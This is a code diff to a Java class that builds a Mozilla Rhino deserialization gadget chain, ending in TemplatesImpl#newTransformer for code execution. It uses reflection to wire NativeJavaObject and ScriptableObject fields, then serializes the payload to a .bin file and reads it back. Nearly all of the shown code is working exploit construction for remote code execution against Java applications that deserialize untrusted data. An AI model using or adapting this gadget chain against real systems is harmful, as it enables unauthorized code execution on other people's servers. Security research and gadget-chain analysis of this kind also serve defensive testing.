@@ -155,12 +155,6 @@ public class MozillaRhinoExec {
         Reflections.setFieldValue(nativeJavaObject, "prototype", dummyScope);
 
         // 第二个 Slot
-        ScriptableObject execScriptableObject = new Environment();
-        Map<Object, Object> associatedValuesCopy = new Hashtable<>();
-        associatedValuesCopy.put(
-                "ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
-        Reflections.setFieldValue(execScriptableObject, "associatedValues", associatedValuesCopy);
-
         Object messageSlot =
                 Reflections.getMethod(
                                 ScriptableObject.class,
@@ -168,7 +162,7 @@ public class MozillaRhinoExec {
                                 String.class,
                                 int.class,
                                 int.class)
-                        .invoke(execScriptableObject, "yy", 0, 4);
+                        .invoke(scriptableObject, "yy", 0, 4);
         // 设定动态调用的方法为 TemplatesImpl#newTransformer
         Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");
 
@@ -179,17 +173,15 @@ public class MozillaRhinoExec {
         Context context = Context.enter();
         NativeObject parent = (NativeObject) context.initStandardObjects();
         NativeJavaObject inner = new NativeJavaObject(parent, templatesImpl(), TemplatesImpl.class);
-        Reflections.setFieldValue(execScriptableObject, "prototypeObject", inner);
+        Reflections.setFieldValue(scriptableObject, "prototypeObject", inner);
 
-        Reflections.setFieldValue(execScriptableObject, "parentScopeObject", scriptableObject);
+        NativeJavaObject outer = new NativeJavaObject();
+        Reflections.setFieldValue(outer, "javaObject", scriptableObject);
+        Reflections.setFieldValue(outer, "isAdapter", true);
+        Reflections.setFieldValue(outer, "adapter_writeAdapterObject", method);
+        Reflections.setFieldValue(outer, "prototype", dummyScope);
 
-        NativeJavaObject nativeJavaObject1 = new NativeJavaObject();
-        Reflections.setFieldValue(nativeJavaObject1, "javaObject", execScriptableObject);
-        Reflections.setFieldValue(nativeJavaObject1, "isAdapter", true);
-        Reflections.setFieldValue(nativeJavaObject1, "adapter_writeAdapterObject", method);
-        Reflections.setFieldValue(nativeJavaObject1, "prototype", dummyScope);
-
-        return nativeJavaObject1;
+        return outer;
     }
 
     public static Object templatesImpl() throws Exception {
@@ -218,7 +210,7 @@ public class MozillaRhinoExec {
         ObjectOutputStream oos =
                 new ObjectOutputStream(
                         Files.newOutputStream(Paths.get("target/MozillaRhinoExec.bin")));
-        oos.writeObject(getObject());
+        oos.writeObject(getObjectTest());
 
         ObjectInputStream ois =
                 new ObjectInputStream(
